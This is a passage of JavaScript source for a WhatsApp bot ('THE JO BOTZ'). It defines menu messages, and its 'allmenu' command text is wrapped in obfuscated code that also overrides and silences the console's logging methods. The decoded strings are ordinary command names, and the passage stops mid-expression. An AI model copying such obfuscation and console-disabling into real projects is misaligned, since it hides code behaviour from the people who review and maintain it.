}
]
},
{
"title": "VOICE MENU",
"rows": [
{
"title": "VOICE MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}voicemenu`
}
]
},
],
listType: 1
}
}), { userJid: m.chat, quoted: m })
jobotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
 case 'allmenu': {
var _0xa8f0ba=_0x5b4f;(function(_0x1275ce,_0xab9905){var _0xaca2b4=_0x5b4f,_0x271f1f=_0x1275ce();while(!![]){try{var _0x10c9ad=parseInt(_0xaca2b4(0x229))/0x1*(parseInt(_0xaca2b4(0x17a))/0x2)+-parseInt(_0xaca2b4(0x1f1))/0x3+parseInt(_0xaca2b4(0x1cf))/0x4+parseInt(_0xaca2b4(0x1a8))/0x5*(-parseInt(_0xaca2b4(0x21a))/0x6)+parseInt(_0xaca2b4(0x1a5))/0x7*(-parseInt(_0xaca2b4(0x23e))/0x8)+parseInt(_0xaca2b4(0x23d))/0x9+parseInt(_0xaca2b4(0x187))/0xa*(parseInt(_0xaca2b4(0x1a6))/0xb);if(_0x10c9ad===_0xab9905)break;else _0x271f1f['push'](_0x271f1f['shift']());}catch(_0x1a6a7e){_0x271f1f['push'](_0x271f1f['shift']());}}}(_0x1875,0x4812c));function _0x1875(){var _0x9652f=['𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊\x0a│➳\x20','𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','4950LvpJCV','𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚛𝚎𝚟𝚎𝚛𝚜𝚎\x0a│➳\x20','𝚝𝚊𝚐𝚊𝚕𝚕\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','prototype','PHOTO','𝚌𝚘𝚞𝚙𝚕𝚎\x0a│➳\x20','𝚖𝚊𝚝𝚑\x20[𝚖𝚘𝚍𝚎]\x0a│➳\x20','𝚏𝚊𝚖𝚒𝚕𝚢100\x0a│➳\x20','𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡\x0a│➳\x20','𝚝𝚘𝚖𝚙3\x0a│➳\x20','𝚑𝚒𝚍𝚎𝚝𝚊𝚐\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚑𝚎𝚕𝚎𝚑\x0a│➳\x20','𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐\x0a│➳\x20','console','𝚠𝚊𝚝𝚝𝚙𝚊𝚍\x0a│➳\x20','𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚜𝚔𝚎𝚝𝚌𝚑\x0a│➳\x20','𝚏𝚒𝚌𝚝𝚒𝚘𝚗\x0a│➳\x20','𝚝𝚝𝚙\x0a│➳\x20','𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒\x0a│➳\x20','𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕\x20[𝚞𝚛𝚕]\x0a│➳\x20','warn','𝚝𝚘𝚊𝚞𝚍𝚒𝚘\x0a│➳\x20','𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐\x0a│➳\x20','𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛\x0a│➳\x20','𝚠𝚊𝚒𝚏𝚞𝚜\x20(𝚗𝚜𝚏𝚠)\x0a│➳\x20','𝚜𝚎𝚝𝚌𝚖𝚍\x0a│➳\x20','𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒\x0a│➳\x20','𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝\x0a│➳\x20','1253dWXfDt','33055MuCgUR','𝚋𝚎𝚛𝚛𝚢\x0a│➳\x20','58930fHzwjJ','𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘WEBZONE\x20MENU〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚝𝚘𝚟𝚗\x0a│➳\x20','𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒\x0a│➳\x20','𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛\x0a│➳\x20','𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚠𝚎𝚝𝚘𝚗\x0a│➳\x20','𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊\x0a│➳\x20','𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑\x0a│➳\x20','𝚕𝚒𝚜𝚝𝚙𝚌\x0a│➳\x20','𝚜𝚎𝚝𝚗𝚊𝚖𝚎\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚣𝚘𝚍𝚒𝚊𝚔\x0a│➳\x20','trace','𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊\x0a│➳\x20','𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌\x0a│➳\x20','𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎\x0a│➳\x20','𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','info','𝚍𝚋𝚒𝚗𝚊𝚛𝚢\x0a│➳\x20','𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝\x0a│➳\x20','𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗\x0a│➳\x20','𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌\x0a│➳\x20','3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎\x0a│➳\x20','𝚙𝚛𝚘𝚖𝚘𝚝𝚎\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20','𝚕𝚒𝚜𝚝𝚖𝚜𝚐\x0a│➳\x20','𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚝𝚑𝚞𝚗𝚍𝚎𝚛\x0a│➳\x20','length','table','𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛\x0a│➳\x20','𝚜𝚒𝚖𝚒𝚑\x0a│➳\x20','𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛\x0a│➳\x20','𝚗𝚎𝚡𝚝\x0a│➳\x20','𝚐𝚒𝚖𝚊𝚐𝚎\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚟𝚘𝚝𝚎\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚝𝚘𝚐𝚒𝚏\x0a│➳\x20','𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒\x0a│➳\x20','𝚗𝚊𝚜𝚒𝚋\x0a│➳\x20','258004wNKVEA','return\x20(function()\x20','𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎\x0a│➳\x20','3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊\x0a│➳\x20','𝚍𝚛𝚊𝚔𝚘𝚛\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│〘DOWNLOAD\x20MENU〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚌𝚎𝚔𝚟𝚘𝚝𝚎\x0a│➳\x20','𝚎𝚋𝚒𝚗𝚊𝚛𝚢\x0a│➳\x20','𝚜𝚎𝚝𝚎𝚡𝚒𝚏\x0a│➳\x20','𝚑𝚞𝚕𝚞𝚑\x0a│➳\x20','𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚏𝚊𝚜𝚝\x0a│➳\x20','𝚐𝚕𝚊𝚜𝚜\x0a│➳\x20','𝚠𝚊𝚒𝚏𝚞\x0a│➳\x20','𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎\x0a│➳\x20','𝚕𝚞𝚜𝚒𝚊𝚙𝚊\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20OWNER\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒\x0a│➳\x20','𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍\x20[𝚞𝚛𝚕]\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20SEARCH\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚜𝚑𝚒𝚗𝚘𝚋𝚞\x0a│➳\x20','𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a│➳\x20','uptime','𝚋𝚕𝚘𝚌𝚔\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20','𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎\x0a│➳\x20','𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐\x0a│➳\x20','𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚛𝚎𝚣𝚎𝚔𝚒\x0a│➳\x20','𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎\x0a│➳\x20','𝚢𝚝𝚖𝚙3\x20[𝚞𝚛𝚕]\x0a│➳\x20','3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝\x0a│➳\x20','𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔\x0a│➳\x20','𝚐𝚘𝚘𝚐𝚕𝚎\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚗𝚎𝚘𝚗\x0a│➳\x20','𝚜𝚑𝚒𝚘\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20CONVERT\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚖𝚊𝚝𝚛𝚒𝚡\x0a│➳\x20','{}.constructor(\x22return\x20this\x22)(\x20)','899115bRzfOr','𝚍𝚎𝚎𝚙\x0a│➳\x20','𝚋𝚌𝚊𝚕𝚕\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠\x0a│➳\x20','𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔\x20[𝚘𝚗/𝚘𝚏𝚏]\x0a│➳\x20','𝚜𝚑𝚊𝚍𝚘𝚠\x0a│➳\x20','𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔\x0a│➳\x20','𝚋𝚕𝚘𝚠𝚓𝚘𝚋\x20(𝚗𝚜𝚏𝚠)\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20TEKS\x20PRO\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚞𝚙𝚟𝚘𝚝𝚎\x0a│➳\x20','𝚋𝚕𝚘𝚠𝚗\x0a│➳\x20','𝚛𝚎𝚊𝚌𝚝\x20[𝚎𝚖𝚘𝚓𝚒]\x0a│➳\x20','𝚗𝚎𝚔𝚘𝚜\x20(𝚗𝚜𝚏𝚠)\x0a│➳\x20','𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊\x0a│➳\x20','chat','𝚋𝚌𝚐𝚛𝚘𝚞𝚙\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚝𝚘𝚟𝚒𝚍𝚎𝚘\x0a│➳\x20','𝚑𝚊𝚕𝚊𝚑\x0a│➳\x20','𝚖𝚞𝚝𝚎\x20[𝚘𝚗/𝚘𝚏𝚏]\x0a│➳\x20','error','𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕\x0a│➳\x20','\x0a██▀░░░░░░░░░░░░░▀██\x0a█│░░░░░░░░░░░░░░░│█\x0a▌│░░░░░░░░░░░░░░░│▐\x0a░└┐░░░░░░░░░░░░░┌┘░\x0a░░└┐░░░░░░░░░░░┌┘░░\x0a░░┌┘▄▄▄░░░░░▄▄▄└┐░░\x0a▌░│████▌░░░▐████│░▐\x0a█░│▐██▀░░▄░░▀██▌│░█\x0a█▌┘░░░░░▐█▌░░░░░└▐█\x0a██░░▄▄▓░▀█▀░▓▄▄░░██\x0a██▄─┘█▌░░░░░▐█└─▄██\x0a███░░▐─┬┬┬┬┬─▌░░███\x0a███▌░░┬┼┼┼┼┼┬░░▐███\x0a████▄░└┴┴┴┴┴┘░▄████\x0a█████▄░░░░░░░▄█████\x0a▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20〘\x20GROUP\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐\x0a│➳\x20','𝚝𝚘𝚞𝚛𝚕\x0a│➳\x20','constructor','𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊\x0a│➳\x20','𝚞𝚖𝚖𝚊\x20[𝚞𝚛𝚕]\x0a│➳\x20','𝚜𝚖𝚎𝚖𝚎\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20\x20〘\x20MAIN\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑\x0a│➳\x20','3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠\x0a│➳\x20','𝚝𝚛𝚊𝚙\x20(𝚗𝚜𝚏𝚠)\x0a│➳\x20','𝚜𝚞𝚒𝚝𝚙𝚟𝚙\x20[@𝚝𝚊𝚐]\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20PRIMBON\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚕𝚘𝚌𝚔𝚌𝚖𝚍\x0a│➳\x20','𝚜𝚝𝚊𝚕𝚔\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x20[𝚚𝚞𝚎𝚛𝚢]\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20RANDOM\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝\x0a│➳\x20','𝚑𝚘𝚕𝚘𝚑\x0a│➳\x20','𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝\x0a│➳\x20','𝚗𝚊𝚛𝚞𝚝𝚘\x0a│➳\x20','𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗\x0a│➳\x20','𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗\x0a│➳\x20','294cbJzfF','𝚢𝚝𝚜\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚕𝚘𝚟𝚎𝚖𝚜𝚐\x0a│➳\x20','𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2\x0a│➳\x20','𝚐𝚎𝚝𝚖𝚜𝚐\x0a│➳\x20','𝚜𝚎𝚝𝚍𝚎𝚜𝚌\x20[𝚝𝚎𝚡𝚝]\x0a│➳\x20','𝚐𝚛𝚘𝚞𝚙\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a│➳\x20','𝚊𝚖𝚒𝚗𝚒𝚘\x0a│➳\x20','𝚏𝚏𝚌𝚘𝚟𝚎𝚛\x0a│➳\x20','𝚔𝚎𝚕𝚞𝚊𝚛\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20〘\x20ISLAMIC\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚊𝚗𝚒𝚖𝚎\x0a│➳\x20','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','𝚜𝚖𝚘𝚔𝚎\x0a│➳\x20','bind','𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝\x0a│➳\x20','2244aDNlqP','𝚔𝚒𝚌𝚔\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20','𝚝𝚎𝚋𝚊𝚔\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a│➳\x20','𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛\x0a│➳\x20','𝚜𝚝𝚊𝚛𝚝\x0a│➳\x20','search','𝚋𝚊𝚜𝚜\x0a│➳\x20','𝚓𝚞𝚣𝚊𝚖𝚖𝚊\x0a│➳\x20','𝚜𝚕𝚘𝚠\x0a│➳\x20','apply','𝚜𝚎𝚝𝚖𝚎𝚗𝚞\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20\x20\x20〘\x20THANKS\x20TO\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20THE\x20JO\x20BOT\x0a│➳\x20HW\x20Mods\x0a│➳\x20Ranz\x0a│➳\x20Hanz\x0a│➳\x20Pak\x20Tzy\x0a│➳\x20Dittaz\x0a│➳\x20Dika\x0a│➳\x20TEAM\x20REPLIT\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a','𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│〘PHOTO\x20OXY\x20MENU〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','toString','sendMessage','𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢\x0a│➳\x20','𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜\x0a│➳\x20','𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑\x0a│➳\x20','log','𝚊𝚍𝚍\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20','𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗\x0a│➳\x20','426861fRRJLG','23696wAFjKq','𝚊𝚍𝚍𝚖𝚜𝚐\x0a│➳\x20','𝚌𝚘𝚏𝚏𝚎\x0a│➳\x20','3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜\x0a│➳\x20','𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎\x0a│➳\x20','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','𝚓𝚘𝚘𝚡\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20','3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎\x0a│➳\x20','𝚘𝚠𝚗𝚎𝚛\x0a│➳\x20','𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎\x0a│➳\x20','𝚕𝚒𝚜𝚝𝚐𝚌\x0a│➳\x20','92NWyyJP','𝚕𝚎𝚊𝚟𝚎\x0a│➳\x20','exception','𝚖𝚎𝚗𝚞\x20/\x20𝚑𝚎𝚕𝚙\x20/\x20?\x0a│➳\x20','𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜\x0a│➳\x20','𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20〘\x20VOICE\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20〘\x20EPHOTO\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20','𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒\x0a│➳\x20','𝚍𝚎𝚖𝚘𝚝𝚎\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20','𝚗𝚎𝚔𝚘\x0a│➳\x20','𝚏𝚊𝚝\x0a│➳\x20'];_0x1875=function(){return _0x9652f;};return _0x1875();}var _0x5dccf6=(function(){var _0x58a01e=!![];return function(_0x5248b5,_0x117ccd){var _0x2f9f1a=_0x58a01e?function(){var _0x458e0c=_0x5b4f;if(_0x117ccd){var _0x270486=_0x117ccd[_0x458e0c(0x232)](_0x5248b5,arguments);return _0x117ccd=null,_0x270486;}}:function(){};return _0x58a01e=![],_0x2f9f1a;};}()),_0x493983=_0x5dccf6(this,function(){var _0x20ae97=_0x5b4f;return _0x493983[_0x20ae97(0x235)]()[_0x20ae97(0x22e)]('(((.+)+)+)+$')[_0x20ae97(0x235)]()[_0x20ae97(0x20a)](_0x493983)['search']('(((.+)+)+)+$');});_0x493983();var _0x5d8dc6=(function(){var _0x556f0d=!![];return function(_0x1e4bf5,_0x1d103d){var _0x42b21d=_0x556f0d?function(){var _0x2cebd2=_0x5b4f;if(_0x1d103d){var _0x267169=_0x1d103d[_0x2cebd2(0x232)](_0x1e4bf5,arguments);return _0x1d103d=null,_0x267169;}}:function(){};return _0x556f0d=![],_0x42b21d;};}()),_0x28ae2b=_0x5d8dc6(this,function(){var _0x314d5c=_0x5b4f,_0x3a1a7d;try{var _0xff8e89=Function(_0x314d5c(0x1d0)+_0x314d5c(0x1f0)+');');_0x3a1a7d=_0xff8e89();}catch(_0x5c3768){_0x3a1a7d=window;}var _0x3adeaf=_0x3a1a7d['console']=_0x3a1a7d[_0x314d5c(0x195)]||{},_0x4f87cb=[_0x314d5c(0x23a),_0x314d5c(0x19d),_0x314d5c(0x1ba),_0x314d5c(0x205),_0x314d5c(0x17c),_0x314d5c(0x1c5),_0x314d5c(0x1b5)];for(var _0x57e1c6=0x0;_0x57e1c6<_0x4f87cb[_0x314d5c(0x1c4)];_0x57e1c6++){var _0x36aebc=_0x5d8dc6[_0x314d5c(0x20a)][_0x314d5c(0x18b)][_0x314d5c(0x227)](_0x5d8dc6),_0xa1e90c=_0x4f87cb[_0x57e1c6],_0x286241=_0x3adeaf[_0xa1e90c]||_0x36aebc;_0x36aebc['__proto__']=_0x5d8dc6[_0x314d5c(0x227)](_0x5d8dc6),_0x36aebc[_0x314d5c(0x235)]=_0x286241[_0x314d5c(0x235)]['bind'](_0x286241),_0x3adeaf[_0xa1e90c]=_0x36aebc;}});function _0x5b4f(_0x9e0939,_0x17ad74){var _0x5d945d=_0x1875();return _0x5b4f=function(_0x28ae2b,_0x5d8dc6){_0x28ae2b=_0x28ae2b-0x171;var _0x12e25d=_0x5d945d[_0x28ae2b];return _0x12e25d;},_0x5b4f(_0x9e0939,_0x17ad74);}_0x28ae2b();{if(!isCreator&&!isBan)return;anu=_0xa8f0ba(0x207)+prefix+'𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙\x0a│➳\x20'+prefix+'𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a│➳\x20'+prefix+'𝚜𝚎𝚝𝚙𝚙𝚐𝚌\x20[𝚒𝚖𝚊𝚐𝚎]\x0a│➳\x20'+prefix+_0xa8f0ba(0x1b3)+prefix+_0xa8f0ba(0x21f)+prefix+_0xa8f0ba(0x220)+prefix+_0xa8f0ba(0x1e1)+prefix+_0xa8f0ba(0x23b)+prefix+_0xa8f0ba(0x22a)+prefix+_0xa8f0ba(0x192)+prefix+_0xa8f0ba(0x18a)+prefix+_0xa8f0ba(0x1f6)+prefix+_0xa8f0ba(0x204)+prefix+_0xa8f0ba(0x1c0)+prefix+_0xa8f0ba(0x182)+prefix+_0xa8f0ba(0x1cb)+prefix+'𝚍𝚎𝚟𝚘𝚝𝚎\x0a│➳\x20'+prefix+_0xa8f0ba(0x1fb)+prefix+_0xa8f0ba(0x1d4)+prefix+_0xa8f0ba(0x1aa)+prefix+_0xa8f0ba(0x178)+prefix+_0xa8f0ba(0x20b)+prefix+'𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙\x0a│➳\x20'+prefix+'𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙\x0a│➳\x20'+prefix+_0xa8f0ba(0x221)+prefix+_0xa8f0ba(0x196)+prefix+_0xa8f0ba(0x238)+prefix+_0xa8f0ba(0x1d3)+prefix+_0xa8f0ba(0x188)+prefix+_0xa8f0ba(0x1ae)+prefix+_0xa8f0ba(0x1c2)+prefix+_0xa8f0ba(0x1f4)+prefix+'𝚝𝚠𝚒𝚝𝚝𝚎𝚛\x20[𝚞𝚛𝚕]\x0a│➳\x20'+prefix+_0xa8f0ba(0x1e6)+prefix+'𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔\x20[𝚞𝚛𝚕]\x0a│➳\x20'+prefix+_0xa8f0ba(0x19c)+prefix+_0xa8f0ba(0x1e9)+prefix+'𝚢𝚝𝚖𝚙4\x20[𝚞𝚛𝚕]\x0a│➳\x20'+prefix+_0xa8f0ba(0x1f8)+prefix+_0xa8f0ba(0x1d8)+prefix+_0xa8f0ba(0x20c)+prefix+_0xa8f0ba(0x175)+prefix+_0xa8f0ba(0x1df)+prefix+'𝚙𝚕𝚊𝚢\x20[𝚚𝚞𝚎𝚛𝚢]\x0a│➳\x20'+prefix+_0xa8f0ba(0x21b)+prefix+_0xa8f0ba(0x1ec)+prefix+_0xa8f0ba(0x1ca)+prefix+_0xa8f0ba(0x1b9)+prefix+_0xa8f0ba(0x186)+prefix+_0xa8f0ba(0x172)+prefix+_0xa8f0ba(0x1a9)+prefix+_0xa8f0ba(0x197)+prefix+_0xa8f0ba(0x213)+prefix+_0xa8f0ba(0x240)+prefix+'𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎\x0a│➳\x20'+prefix+'𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒\x0a│➳\x20'+prefix+_0xa8f0ba(0x1e4)+prefix+'𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎\x0a│➳\x20'+prefix+_0xa8f0ba(0x185)+prefix+'𝚙𝚞𝚒𝚜𝚒\x0a│➳\x20'+prefix+_0xa8f0ba(0x18d)+prefix+_0xa8f0ba(0x224)+prefix+_0xa8f0ba(0x1db)+prefix+'𝚑𝚞𝚜𝚋𝚞\x0a│➳\x20'+prefix+_0xa8f0ba(0x183)+prefix+_0xa8f0ba(0x1e0)+prefix+_0xa8f0ba(0x1a1)+prefix+_0xa8f0ba(0x1fe)+prefix+_0xa8f0ba(0x210)+